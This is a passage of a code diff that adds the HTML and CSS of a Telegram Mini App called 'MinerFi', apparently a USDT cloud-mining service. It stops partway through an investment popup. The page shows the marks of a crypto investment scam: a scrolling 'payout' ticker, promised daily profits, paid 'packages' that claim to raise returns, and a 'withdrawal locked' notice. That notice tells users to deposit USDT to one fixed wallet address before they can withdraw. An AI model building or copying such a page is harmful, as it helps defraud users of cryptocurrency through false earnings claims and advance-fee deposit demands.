@@ -1,0 +1,1390 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>MinerFi - Telegram Mini App</title>
+    
+    <!-- Telegram WebApp SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <!-- Font Awesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <!-- Google Fonts: Inter & Outfit -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Outfit:wght@600;700;800;900&display=swap" rel="stylesheet">
+    
+    <!-- Firebase SDK (Compat Version) -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+    <style>
+      :root {
+          --gold-primary: #f59e0b;
+          --gold-gradient: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+          --gold-glow: rgba(245, 158, 11, 0.45);
+          --bg-light: #eaedf2;
+          --dark-card: #0d1117;
+          --text-main: #0f172a;
+          --text-muted: #64748b;
+          --success: #22c55e;
+          --error: #ef4444;
+      }
+
+      * {
+          margin: 0; padding: 0; box-sizing: border-box;
+          font-family: 'Inter', -apple-system, sans-serif;
+          -webkit-tap-highlight-color: transparent;
+      }
+
+      body {
+          background: #eef2f6;
+          color: var(--text-main);
+          height: 100vh;
+          overflow: hidden;
+          display: flex;
+          flex-direction: column;
+          position: relative;
+      }
+
+      body::before {
+          content: "";
+          position: fixed;
+          top: 0; left: 0; width: 100%; height: 100%;
+          background: radial-gradient(circle at 50% 12%, rgba(245, 158, 11, 0.22) 0%, rgba(248, 250, 252, 0.8) 42%, #e2e8f0 100%);
+          z-index: -2;
+      }
+
+      #app {
+          flex: 1;
+          overflow-y: auto;
+          padding: 14px 18px 120px;
+      }
+
+      .page { display: none; animation: fadeIn 0.35s ease; }
+      .page.active { display: block; }
+      @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+      /* ========================================================
+         LIVE WITHDRAW MARQUEE BAR (BERGERAK KE KIRI DARI KANAN)
+      ======================================================== */
+      .premarket-wrapper {
+          text-align: center;
+          margin-bottom: 10px;
+      }
+
+      .payout-marquee-bar {
+          display: flex;
+          align-items: center;
+          background: rgba(255, 255, 255, 0.94);
+          backdrop-filter: blur(12px);
+          -webkit-backdrop-filter: blur(12px);
+          border: 1.5px solid rgba(34, 197, 94, 0.45);
+          padding: 6px 12px;
+          border-radius: 40px;
+          box-shadow: 0 4px 15px rgba(34, 197, 94, 0.14);
+          overflow: hidden;
+          width: 100%;
+          max-width: 440px;
+          margin: 0 auto;
+      }
+
+      .payout-fixed-tag {
+          display: inline-flex;
+          align-items: center;
+          gap: 6px;
+          padding-right: 8px;
+          flex-shrink: 0;
+          z-index: 2;
+      }
+
+      .pulse-dot {
+          width: 7px; height: 7px;
+          background: #22c55e;
+          border-radius: 50%;
+          box-shadow: 0 0 8px #22c55e;
+          animation: pulseDot 1.5s infinite;
+          flex-shrink: 0;
+      }
+      @keyframes pulseDot {
+          0%, 100% { transform: scale(1); opacity: 1; }
+          50% { transform: scale(1.35); opacity: 0.6; }
+      }
+
+      .pm-tag {
+          background: #dcfce7;
+          color: #15803d;
+          font-size: 9.5px;
+          font-weight: 900;
+          letter-spacing: 0.5px;
+          padding: 2px 7px;
+          border-radius: 6px;
+          border: 1px solid #bbf7d0;
+      }
+
+      .payout-track-viewport {
+          flex: 1;
+          overflow: hidden;
+          position: relative;
+          mask-image: linear-gradient(to right, transparent 0%, black 6%, black 94%, transparent 100%);
+          -webkit-mask-image: linear-gradient(to right, transparent 0%, black 6%, black 94%, transparent 100%);
+      }
+
+      .payout-track {
+          display: inline-flex;
+          align-items: center;
+          white-space: nowrap;
+          will-change: transform;
+          animation: scrollLeftFromRight 24s linear infinite;
+      }
+
+      @keyframes scrollLeftFromRight {
+          0% { transform: translateX(0%); }
+          100% { transform: translateX(-50%); }
+      }
+
+      .payout-item {
+          display: inline-flex;
+          align-items: center;
+          gap: 5px;
+          margin-right: 26px;
+          font-size: 11.5px;
+      }
+
+      .pm-pair {
+          color: #0f172a;
+          font-weight: 700;
+      }
+
+      .pm-price {
+          color: #15803d;
+          font-size: 12.5px;
+          font-weight: 900;
+          font-family: 'Outfit', sans-serif;
+          letter-spacing: 0.2px;
+      }
+
+      .payout-sep {
+          color: #cbd5e1;
+          margin-left: 16px;
+          font-weight: 900;
+      }
+
+      /* ========================================================
+         HERO SECTION: MINERFI COIN
+      ======================================================== */
+      .hero-section {
+          text-align: center;
+          padding: 4px 0 16px;
+          position: relative;
+      }
+
+      .coin-wrapper {
+          position: relative;
+          width: 160px;
+          margin: 0 auto 12px;
+      }
+
+      .coin-wrapper::before {
+          content: "";
+          position: absolute;
+          top: 50%; left: 50%;
+          transform: translate(-50%, -50%);
+          width: 170px; height: 170px;
+          background: radial-gradient(circle, rgba(245, 158, 11, 0.35) 0%, rgba(16, 185, 129, 0.18) 45%, transparent 70%);
+          border-radius: 50%;
+          z-index: -1;
+      }
+
+      .coin-3d {
+          width: 138px; height: 138px;
+          margin: 0 auto;
+          display: block;
+          filter: drop-shadow(0 14px 22px rgba(15, 23, 42, 0.32));
+          animation: floatCoin 3s infinite alternate ease-in-out;
+      }
+
+      @keyframes floatCoin {
+          from { transform: translateY(0px) scale(1); }
+          to { transform: translateY(-5px) scale(1.02); }
+      }
+
+      .brand-title {
+          font-family: 'Outfit', sans-serif;
+          font-size: 26px;
+          font-weight: 900;
+          letter-spacing: -0.5px;
+          color: #0f172a;
+      }
+      .brand-title span { color: #f59e0b; }
+
+      .brand-sub {
+          text-align: center;
+          color: #475569;
+          font-size: 11px;
+          font-weight: 700;
+          letter-spacing: 2px;
+          text-transform: uppercase;
+          margin-top: 4px;
+      }
+
+      /* ========================================================
+         BALANCE CARD
+      ======================================================== */
+      .balance-dark-card {
+          background: linear-gradient(180deg, #131722 0%, #0a0d14 100%);
+          border-radius: 26px;
+          padding: 16px 18px;
+          display: flex;
+          align-items: center;
+          justify-content: flex-start;
+          position: relative;
+          border: 1.5px solid #f59e0b;
+          box-shadow: 
+              0 14px 35px rgba(0, 0, 0, 0.35),
+              0 0 25px rgba(245, 158, 11, 0.35),
+              inset 0 1px 1px rgba(255, 255, 255, 0.2);
+          margin: 16px 0 18px;
+          overflow: hidden;
+      }
+
+      .balance-left-icon {
+          width: 54px; height: 54px;
+          border-radius: 50%;
+          background: radial-gradient(circle, #2d3748 0%, #111827 100%);
+          border: 1.5px solid rgba(255, 215, 0, 0.6);
+          display: flex; align-items: center; justify-content: center;
+          box-shadow: 0 0 15px rgba(245, 158, 11, 0.3);
+          flex-shrink: 0;
+      }
+      .balance-left-icon i {
+          color: #fef08a;
+          font-size: 24px;
+          filter: drop-shadow(0 0 8px #f59e0b);
+      }
+
+      .balance-center-info {
+          flex: 1;
+          padding-left: 14px;
+          min-width: 0;
+      }
+      .balance-label {
+          color: #94a3b8;
+          font-size: 10px;
+          font-weight: 800;
+          letter-spacing: 0.8px;
+          text-transform: uppercase;
+          white-space: nowrap;
+      }
+      .balance-value {
+          color: #ffffff;
+          font-size: 27px;
+          font-weight: 900;
+          letter-spacing: -0.5px;
+          margin: 2px 0;
+          text-shadow: 0 2px 10px rgba(0,0,0,0.5);
+          white-space: nowrap;
+      }
+
+      .balance-rate {
+          color: #22c55e;
+          font-size: 11.5px;
+          font-weight: 800;
+          display: flex;
+          align-items: center;
+          white-space: nowrap;
+          text-shadow: 0 0 8px rgba(34, 197, 94, 0.4);
+      }
+
+      /* ========================================================
+         INVESTMENT CARD
+      ======================================================== */
+      .invest-glass-card {
+          background: #ffffff;
+          border-radius: 28px;
+          padding: 20px 14px;
+          box-shadow: 0 16px 35px rgba(0, 0, 0, 0.05);
+          border: 1px solid #ffffff;
+          margin-bottom: 20px;
+      }
+
+      .invest-header {
+          display: flex;
+          align-items: center;
+          gap: 14px;
+          margin-bottom: 16px;
+      }
+      .gift-icon-3d {
+          width: 48px; height: 48px;
+          background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+          border-radius: 14px;
+          display: flex; align-items: center; justify-content: center;
+          color: #ffffff;
+          font-size: 24px;
+          box-shadow: 0 6px 14px rgba(217, 119, 6, 0.35);
+          flex-shrink: 0;
+      }
+      .invest-title-text h4 {
+          font-size: 15px;
+          font-weight: 800;
+          color: #0f172a;
+          line-height: 1.25;
+      }
+      .invest-title-text p {
+          font-size: 11px;
+          color: #64748b;
+          font-weight: 600;
+          margin-top: 2px;
+      }
+
+      .package-glass-grid {
+          display: grid;
+          grid-template-columns: repeat(5, 1fr);
+          gap: 7px;
+      }
+      .glass-pkg-item {
+          background: #ffffff;
+          border: 1.5px solid #f1f5f9;
+          border-radius: 15px;
+          padding: 10px 2px;
+          text-align: center;
+          cursor: pointer;
+          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.04);
+          transition: all 0.2s cubic-bezier(0.34, 1.56, 0.64, 1);
+          min-width: 0;
+      }
+      .glass-pkg-item:active {
+          transform: scale(0.92);
+          background: #fffbeb;
+      }
+      .glass-pkg-item b {
+          display: block;
+          font-family: 'Outfit', sans-serif;
+          font-size: clamp(14px, 4vw, 18px);
+          font-weight: 900;
+          color: #d97706;
+          letter-spacing: -0.5px;
+          white-space: nowrap;
+      }
+      .glass-pkg-item small {
+          display: block;
+          font-size: 8.5px;
+          font-weight: 800;
+          color: #0f172a;
+          margin-top: 2px;
+          white-space: nowrap;
+      }
+
+      /* ========================================================
+         FLOATING BOTTOM NAV BAR (4 TABS IN ONE CAPSULE)
+      ======================================================== */
+      .nav-wrapper {
+          position: fixed;
+          bottom: 16px;
+          left: 0;
+          width: 100%;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          padding: 0 12px;
+          z-index: 1000;
+          pointer-events: none;
+      }
+
+      .nav-dark-capsule {
+          pointer-events: auto;
+          background: linear-gradient(180deg, #1a1e28 0%, #0d1017 100%);
+          border-radius: 50px;
+          padding: 6px 8px;
+          display: flex;
+          align-items: center;
+          gap: 6px;
+          border: 1.5px solid #f59e0b;
+          box-shadow: 
+              0 14px 35px rgba(0, 0, 0, 0.45),
+              0 0 20px rgba(245, 158, 11, 0.35);
+      }
+
+      .nav-tab-item {
+          display: flex;
+          align-items: center;
+          gap: 7px;
+          padding: 10px 13px;
+          border-radius: 40px;
+          cursor: pointer;
+          color: #94a3b8;
+          font-size: 18px;
+          transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+          user-select: none;
+      }
+
+      .nav-tab-item .tab-text {
+          display: none;
+          font-size: 12.5px;
+          font-weight: 800;
+          color: #ffffff;
+          white-space: nowrap;
+      }
+
+      .nav-tab-item.active {
+          background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+          color: #ffffff;
+          padding: 10px 16px;
+          box-shadow: 0 0 16px rgba(245, 158, 11, 0.65);
+      }
+      .nav-tab-item.active .tab-text { display: inline-block; }
+      .nav-tab-item.active i { color: #ffffff; }
+      .nav-tab-item:active { transform: scale(0.92); }
+
+      .card-theme {
+          background: #ffffff;
+          border-radius: 20px;
+          padding: 18px;
+          box-shadow: 0 6px 18px rgba(0, 0, 0, 0.04);
+          margin-bottom: 14px;
+          border: 1px solid #f1f5f9;
+      }
+      .btn-gold {
+          background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+          color: #ffffff;
+          border: none;
+          padding: 12px;
+          border-radius: 14px;
+          font-weight: 800;
+          font-size: 14px;
+          width: 100%;
+          cursor: pointer;
+          box-shadow: 0 6px 18px rgba(217, 119, 6, 0.35);
+          transition: 0.2s;
+          margin-top: 10px;
+      }
+      .btn-gold:active { transform: scale(0.96); }
+      .btn-outline-gold {
+          background: transparent;
+          border: 1.5px solid #d97706;
+          color: #b45309;
+          font-weight: 800;
+      }
+      .btn-done {
+          background: #e2e8f0 !important;
+          color: #64748b !important;
+          cursor: not-allowed;
+          box-shadow: none !important;
+      }
+
+      .badge-verified {
+          display: inline-flex; align-items: center; gap: 4px;
+          background: linear-gradient(45deg, #d86111, #f59e0b);
+          color: #fff; padding: 4px 12px; border-radius: 50px;
+          font-size: 10px; font-weight: 800;
+      }
+
+      .warning-box {
+          background: #fff5f5; color: var(--error); padding: 14px;
+          border-radius: 14px; font-size: 12px; margin-bottom: 16px;
+          border: 1px solid #ffe6e6; font-weight: 600; line-height: 1.5;
+      }
+
+      .info-box {
+          background: #f0fdf4; color: #166534; padding: 14px;
+          border-radius: 14px; font-size: 12px; margin-bottom: 16px;
+          border: 1px solid #bbf7d0; font-weight: 600;
+      }
+
+      .address-box {
+          background: #ffffff; padding: 10px; border-radius: 10px;
+          font-family: monospace; font-size: 11px; word-break: break-all;
+          border: 1px solid #cbd5e1; margin: 8px 0; color: #334155;
+      }
+
+      input {
+          width: 100%; background: #ffffff; border: 1.5px solid #cbd5e1;
+          padding: 12px; border-radius: 12px; margin: 8px 0; outline: none;
+          font-size: 13px; font-weight: 600;
+      }
+
+      .avatar-img {
+          width: 75px; height: 75px; border-radius: 50%;
+          object-fit: cover; border: 2.5px solid #f59e0b;
+          margin: 0 auto 10px; display: block;
+          box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3);
+      }
+
+      .modal-overlay {
+          position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+          background: rgba(15, 23, 42, 0.7); backdrop-filter: blur(8px);
+          display: none; justify-content: center; align-items: center; z-index: 10000;
+          padding: 20px;
+      }
+      .modal-box {
+          background: #ffffff; width: 100%; max-width: 400px;
+          border-radius: 24px; padding: 22px; text-align: center;
+          box-shadow: 0 20px 45px rgba(0,0,0,0.3);
+          border: 1.5px solid rgba(255, 215, 0, 0.5);
+      }
+
+      #toast {
+          position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+          background: #111827; color: #ffd700; padding: 10px 24px; border-radius: 50px;
+          font-size: 13px; font-weight: 800; display: none; z-index: 10001;
+          box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+          border: 1px solid rgba(255, 215, 0, 0.4);
+      }
+    </style>
+  </head>
+  <body>
+    <div id="toast">Copied!</div>
+
+    <div id="app">
+      <!-- ==========================================
+           PAGE 1: HOME
+      ========================================== -->
+      <div id="page-home" class="page active">
+        
+        <!-- LIVE PAYOUT MARQUEE DI PALING ATAS (BERGERAK DARI KANAN KE KIRI) -->
+        <div class="premarket-wrapper">
+          <div class="payout-marquee-bar">
+            <div class="payout-fixed-tag">
+              <span class="pulse-dot"></span>
+              <span class="pm-tag">PAYOUT</span>
+            </div>
+            <div class="payout-track-viewport">
+              <div class="payout-track" id="payout-track"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- HERO COIN (SPLIT GREEN & GOLD TETHER COIN) -->
+        <div class="hero-section">
+          <div class="coin-wrapper">
+            <svg class="coin-3d" viewBox="0 0 200 200">
+              <defs>
+                <!-- Left & Right Split Clips -->
+                <clipPath id="clipLeft">
+                  <rect x="0" y="0" width="100" height="200" />
+                </clipPath>
+                <clipPath id="clipRight">
+                  <rect x="100" y="0" width="100" height="200" />
+                </clipPath>
+
+                <!-- Rim Gradients -->
+                <linearGradient id="greenRim" x1="0%" y1="0%" x2="100%" y2="100%">
+                  <stop offset="0%" stop-color="#17945e" />
+                  <stop offset="50%" stop-color="#0b6b42" />
+                  <stop offset="100%" stop-color="#06452a" />
+                </linearGradient>
+                <linearGradient id="goldRimCoin" x1="0%" y1="0%" x2="100%" y2="100%">
+                  <stop offset="0%" stop-color="#fbd257" />
+                  <stop offset="50%" stop-color="#d49c1a" />
+                  <stop offset="100%" stop-color="#926308" />
+                </linearGradient>
+
+                <!-- Inner Face Gradients -->
+                <linearGradient id="greenFace" x1="20%" y1="0%" x2="80%" y2="100%">
+                  <stop offset="0%" stop-color="#0e7d4e" />
+                  <stop offset="100%" stop-color="#075332" />
+                </linearGradient>
+                <linearGradient id="goldFace" x1="20%" y1="0%" x2="80%" y2="100%">
+                  <stop offset="0%" stop-color="#ecc03d" />
+                  <stop offset="100%" stop-color="#c08a14" />
+                </linearGradient>
+
+                <!-- Symbol Gradients -->
+                <linearGradient id="symWhite" x1="0%" y1="0%" x2="100%" y2="100%">
+                  <stop offset="0%" stop-color="#ffffff" />
+                  <stop offset="100%" stop-color="#dbe2ea" />
+                </linearGradient>
+                <linearGradient id="symGold" x1="0%" y1="0%" x2="100%" y2="100%">
+                  <stop offset="0%" stop-color="#e3b43b" />
+                  <stop offset="100%" stop-color="#9f7010" />
+                </linearGradient>
+
+                <!-- Curved Text Paths -->
+                <path id="rimTextTop" d="M 19,100 A 81,81 0 0,1 181,100" />
+                <path id="rimTextBottom" d="M 11,100 A 89,89 0 0,0 189,100" />
+              </defs>
+
+              <!-- Outer Edge Shadow Ring -->
+              <circle cx="100" cy="100" r="97" fill="#0f172a" />
+
+              <!-- Outer Rim: Green Left & Gold Right -->
+              <circle cx="100" cy="100" r="95" fill="url(#greenRim)" clip-path="url(#clipLeft)" />
+              <circle cx="100" cy="100" r="95" fill="url(#goldRimCoin)" clip-path="url(#clipRight)" />
+
+              <!-- Subtle Bevel Groove Between Rim & Inner Face -->
+              <circle cx="100" cy="100" r="74" fill="none" stroke="rgba(0,0,0,0.45)" stroke-width="2.5" />
+              <circle cx="100" cy="100" r="72" fill="none" stroke="rgba(255,255,255,0.18)" stroke-width="1" />
+
+              <!-- Inner Face: Green Left & Gold Right -->
+              <circle cx="100" cy="100" r="72" fill="url(#greenFace)" clip-path="url(#clipLeft)" />
+              <circle cx="100" cy="100" r="72" fill="url(#goldFace)" clip-path="url(#clipRight)" />
+
+              <!-- Center Split Line -->
+              <line x1="100" y1="5" x2="100" y2="195" stroke="rgba(0,0,0,0.16)" stroke-width="1" />
+
+              <!-- Rim Text: Top ("IN GOD WE TRUST") -->
+              <text fill="#f8fafc" font-family="Inter, Arial, sans-serif" font-size="9.6" font-weight="800" letter-spacing="0.8" filter="drop-shadow(0 1px 1px rgba(0,0,0,0.45))">
+                <textPath href="#rimTextTop" startOffset="50%" text-anchor="middle">IN GOD WE TRUST</textPath>
+              </text>
+
+              <!-- Rim Text: Bottom Left ("IN GOD WE TRUST") -->
+              <text fill="#f8fafc" font-family="Inter, Arial, sans-serif" font-size="9.6" font-weight="800" letter-spacing="0.8" filter="drop-shadow(0 1px 1px rgba(0,0,0,0.45))">
+                <textPath href="#rimTextBottom" startOffset="23%" text-anchor="middle">IN GOD WE TRUST</textPath>
+              </text>
+
+              <!-- Rim Text: Bottom Right ("IN GOD WE TRUST") -->
+              <text fill="#fef9c3" font-family="Inter, Arial, sans-serif" font-size="9.6" font-weight="800" letter-spacing="0.8" filter="drop-shadow(0 1px 1px rgba(0,0,0,0.45))">
+                <textPath href="#rimTextBottom" startOffset="77%" text-anchor="middle">IN GOD WE TRUST</textPath>
+              </text>
+
+              <!-- 3 Dark Rivet Holes on Rim (Cleanly placed in empty gaps between texts) -->
+              <g>
+                <circle cx="29.5" cy="52.5" r="4.2" fill="#090d14" stroke="rgba(255,255,255,0.25)" stroke-width="1" />
+                <circle cx="170.5" cy="52.5" r="4.2" fill="#090d14" stroke="rgba(255,255,255,0.25)" stroke-width="1" />
+                <circle cx="100" cy="184.5" r="4.2" fill="#090d14" stroke="rgba(255,255,255,0.25)" stroke-width="1" />
+              </g>
+
+              <!-- Center Split Tether Emblem (T + 3D Halo Ring) -->
+              <g clip-path="url(#clipLeft)" filter="drop-shadow(0 3px 4px rgba(0,0,0,0.35))">
+                <path d="M 52,103 A 48,14 0 0,1 148,103 L 138,103 A 38,9 0 0,0 62,103 Z" fill="#e2e8f0" />
+                <path d="M 60,55 H 140 V 75 H 111 V 148 H 89 V 75 H 60 Z" fill="url(#symWhite)" stroke="rgba(0,0,0,0.2)" stroke-width="1" />
+                <path d="M 52,103 A 48,14 0 0,0 148,103 L 138,103 A 38,9 0 0,1 62,103 Z" fill="#ffffff" stroke="rgba(0,0,0,0.18)" stroke-width="1" />
+              </g>
+
+              <g clip-path="url(#clipRight)" filter="drop-shadow(0 3px 4px rgba(0,0,0,0.35))">
+                <path d="M 52,103 A 48,14 0 0,1 148,103 L 138,103 A 38,9 0 0,0 62,103 Z" fill="#b47e11" />
+                <path d="M 60,55 H 140 V 75 H 111 V 148 H 89 V 75 H 60 Z" fill="url(#symGold)" stroke="rgba(75,45,0,0.45)" stroke-width="1.2" />
+                <path d="M 52,103 A 48,14 0 0,0 148,103 L 138,103 A 38,9 0 0,1 62,103 Z" fill="#dfb13b" stroke="rgba(75,45,0,0.4)" stroke-width="1.2" />
+              </g>
+            </svg>
+          </div>
+
+          <h2 class="brand-title">Miner<span>Fi</span></h2>
+          <div class="brand-sub">Automated Cloud Mining Active</div>
+        </div>
+
+        <!-- BALANCE CARD (DAILY PROFIT $0.50) -->
+        <div class="balance-dark-card">
+          <div class="balance-left-icon">
+            <i class="fas fa-bolt"></i>
+          </div>
+
+          <div class="balance-center-info">
+            <div class="balance-label">WITHDRAWABLE MINING BALANCE</div>
+            <div class="balance-value">$<span id="bal-main">0.000000</span></div>
+            <div class="balance-rate">
+              <span>Daily Profit: $<span id="rate-display">0.50</span> / 24 hours</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- INVESTMENT CARD ($1-$10 + $15 $25 $50 $75 $100) -->
+        <div class="invest-glass-card">
+          <div class="invest-header">
+            <div class="gift-icon-3d">
+              <i class="fas fa-rocket"></i>
+            </div>
+            <div class="invest-title-text">
+              <h4>Investment Packages</h4>
+              <p>Upgrade your cloud miner power to boost daily USDT profits</p>
+            </div>
+          </div>
+
+          <div class="package-glass-grid" id="pkg-list"></div>
+        </div>
+
+      </div>
+
+      <!-- ==========================================
+           PAGE 2: TASKS (NO REWARD)
+      ========================================== -->
+      <div id="page-tasks" class="page">
+        <h3 style="font-family:'Outfit',sans-serif; margin-bottom: 8px;">Community Tasks</h3>
+        <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 16px;">
+          Join the official community channels below to stay updated with MinerFi:
+        </p>
+
+        <div class="card-theme">
+          <div style="display: flex; justify-content: space-between; align-items: center;">
+            <div>
+              <p style="font-weight: 800; font-size: 14px;">Join Durov Channel</p>
+              <small style="color: var(--text-muted); font-weight: 600;">Official Telegram Channel</small>
+            </div>
+            <button id="btn-task-durov" class="btn-gold" style="width: auto; margin:0; padding: 8px 18px; font-size: 12px;" onclick="doTask('durov', 'https://t.me/durov')">
+              Join
+            </button>
+          </div>
+        </div>
+
+        <div class="card-theme">
+          <div style="display: flex; justify-content: space-between; align-items: center;">
+            <div>
+              <p style="font-weight: 800; font-size: 14px;">Join Walt News Channel</p>
+              <small style="color: var(--text-muted); font-weight: 600;">Official Telegram Channel</small>
+            </div>
+            <button id="btn-task-walt" class="btn-gold" style="width: auto; margin:0; padding: 8px 18px; font-size: 12px;" onclick="doTask('walt', 'https://t.me/walt_news')">
+              Join
+            </button>
+          </div>
+        </div>
+
+        <div class="card-theme">
+          <div style="display: flex; justify-content: space-between; align-items: center;">
+            <div>
+              <p style="font-weight: 800; font-size: 14px;">Join MinerFi Channel</p>
+              <small style="color: var(--text-muted); font-weight: 600;">Official Telegram Channel</small>
+            </div>
+            <button id="btn-task-onecoin5" class="btn-gold" style="width: auto; margin:0; padding: 8px 18px; font-size: 12px;" onclick="doTask('onecoin5', 'https://t.me/MinerFi_Channel')">
+              Join
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- ==========================================
+           PAGE 3: WITHDRAW (MIN. $1.00 USDT)
+      ========================================== -->
+      <div id="page-withdraw" class="page">
+        <h3 style="font-family:'Outfit',sans-serif; margin-bottom: 15px;">Withdrawal Center</h3>
+
+        <div id="wd-section-usdt">
+          <div id="wd-locked-box" class="warning-box" style="display: none;">
+            <b><i class="fas fa-lock"></i> USDT Withdrawal Locked</b><br />
+            USDT withdrawals are currently <b>LOCKED</b> by the Administrator. To unlock withdrawals, please deposit a minimum of <b>$1 USDT (BEP20)</b> to the official address below and wait for Admin verification:
+            <div class="address-box" id="deposit-addr-display">0x541160E598Fd2d51c21aA977beb674bb207bFaB8</div>
+            <button class="btn-gold" style="font-size: 11px; height: 38px; margin-top: 5px;" onclick="copyAddr()">
+              <i class="fas fa-copy"></i> Copy Deposit Address
+            </button>
+          </div>
+
+          <div id="wd-unlocked-box" class="info-box" style="display: block;">
+            <b><i class="fas fa-check-circle"></i> Withdrawal System Active!</b><br />
+            You can withdraw your USDT balance directly to your BEP20 wallet (Min. $1.00 USDT).
+          </div>
+
+          <div class="card-theme">
+            <label style="font-size: 11px; color: var(--text-muted); font-weight: 700;">Recipient Wallet Address (USDT BEP20)</label>
+            <input type="text" id="wd-address" placeholder="0x..." />
+
+            <label style="font-size: 11px; color: var(--text-muted); font-weight: 700;">Withdrawal Amount (Min. $1.00 USDT)</label>
+            <input type="number" id="wd-amt" placeholder="1.00" step="0.01" />
+
+            <button class="btn-gold" onclick="handleWithdrawAction()">Withdraw USDT Now</button>
+          </div>
+
+          <div class="card-theme">
+            <h4 style="margin-bottom: 10px; font-size: 14px;">USDT Withdrawal History</h4>
+            <div id="history-list"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ==========================================
+           PAGE 4: PROFILE
+      ========================================== -->
+      <div id="page-profile" class="page">
+        <div class="card-theme" style="text-align: center;">
+          <img id="prof-avatar" class="avatar-img" src="https://via.placeholder.com/150" alt="Avatar" />
+          <h3 id="prof-user" style="font-family:'Outfit',sans-serif;">@User</h3>
+          <div class="badge-verified"><i class="fas fa-check-circle"></i> MinerFi Miner</div>
+          <p style="color: var(--text-muted); font-size: 12px; margin-top: 10px; font-weight: 600;">
+            Referral Code: <b id="prof-ref-code" style="color:#0f172a; letter-spacing: 1px;">ABCDEF</b>
+          </p>
+        </div>
+
+        <!-- MINING BALANCE IN PROFILE -->
+        <div class="card-theme" style="padding: 15px;">
+          <div style="background: #ffffff; padding: 14px; border-radius: 14px; border: 1px solid #e2e8f0; text-align: center;">
+            <small style="color: var(--text-muted); font-size: 10px; font-weight: 800; text-transform: uppercase;">Mining Balance</small>
+            <div style="font-size: 20px; font-weight: 900; color: #0f172a; margin-top: 5px;">
+              $<span id="prof-bal-usdt">0.0000</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="card-theme">
+          <h4 style="margin-bottom: 8px; font-size: 14px;">Your Referral Link</h4>
+          <div class="address-box" id="ref-link">Loading referral link...</div>
+          <button class="btn-gold btn-outline-gold" style="height: 40px; font-size: 13px;" onclick="copyRef()">Copy Referral Link</button>
+          <div style="margin-top: 15px; font-size: 13px; font-weight: 600;">
+            Total Active Referrals: <span id="ref-count" style="font-weight: 900; color: #b45309;">0</span> users
+          </div>
+        </div>
+
+        <div class="card-theme">
+          <h4 style="margin-bottom: 5px; font-size: 14px;">Enter Inviter Code</h4>
+          <p style="font-size: 11px; color: var(--text-muted); margin-bottom: 8px;">
+            Bind your inviter's referral code (letters) to claim an instant bonus of <b style="color: #15803d;">+$0.10 USDT</b>:
+          </p>
+          <input type="text" id="input-inviter-id" placeholder="e.g. BCDEFG" style="text-transform: uppercase;" />
+          <button class="btn-gold" id="btn-submit-ref" onclick="submitManualRef()">Bind Inviter (+$0.10)</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- BOTTOM NAV BAR (PROFILE DI KIRI HOME) -->
+    <div class="nav-wrapper">
+      <div class="nav-dark-capsule">
+        <div class="nav-tab-item" id="nav-btn-profile" onclick="nav('profile')">
+          <i class="fas fa-user"></i>
+          <span class="tab-text">Profile</span>
+        </div>
+        <div class="nav-tab-item active" id="nav-btn-home" onclick="nav('home')">
+          <i class="fas fa-home"></i>
+          <span class="tab-text">Home</span>
+        </div>
+        <div class="nav-tab-item" id="nav-btn-tasks" onclick="nav('tasks')">
+          <i class="fas fa-users"></i>
+          <span class="tab-text">Tasks</span>
+        </div>
+        <div class="nav-tab-item" id="nav-btn-withdraw" onclick="nav('withdraw')">
+          <i class="fas fa-wallet"></i>
+          <span class="tab-text">Withdraw</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- MODAL INVESTMENT POPUP -->
+    <div id="invest-modal" class="modal-overlay">
+      <div class="modal-box">
+        <h3 id="modal-title" style="font-family:'Outfit',sans-serif; margin-bottom: 8px;">Investment Package</h3>
+        <div style="background:#fffbeb; border:1.5px solid #fde68a; color:#92400e; padding:14px; border-radius:16px; margin:14px 0; font-size:12px; text-align:left; line-height: 1.6;">
+          <b>Income Simulation:</b><br />
+          • Package Cost: <b id="sim-pkg-cost">$1.00 USDT</b><br />
+          • Base Mining Rate: <b>$0.50 / day</b><br />
+          • Extra Daily Profit: <b id="sim-pkg-bonus">+$0.10 / day</b><br />
+          • New Total Daily Rate: <b id="sim-pkg-total" style="color:#15803d; font-size:14px;">$0.60 / day</b>
+        </div>
+
+        <p style="font-size: 12px; color: var(--text-muted); text-align: left;">
+          Send the exact package amount above to the official address (BEP20):
+        </p>
+        <div class="address-box">0x541160E598Fd2d51c21aA977beb674bb207bFaB8</div>
+        <button class="btn-gold btn-outline-gold" style="padding:8px; font-size:12px; margin-bottom: 15px;" onclick="copyAddr()">
+          <i class="fas fa-copy"></i> Copy Deposit Address
+        </button>
+
+        <label style="font-size: 11px; color: var(--text-muted); display:block; text-align:left; font-weight:700;">
+          Your Sender USDT Address (Used for payment):
+        </label>
+        <input type="text" id="sender-usdt-address" placeholder="Enter your sender wallet address (0x...)" />
+
+        <button class="btn-gold" onclick="submitDepositConfirmation()">Confirm & Submit Deposit</button>
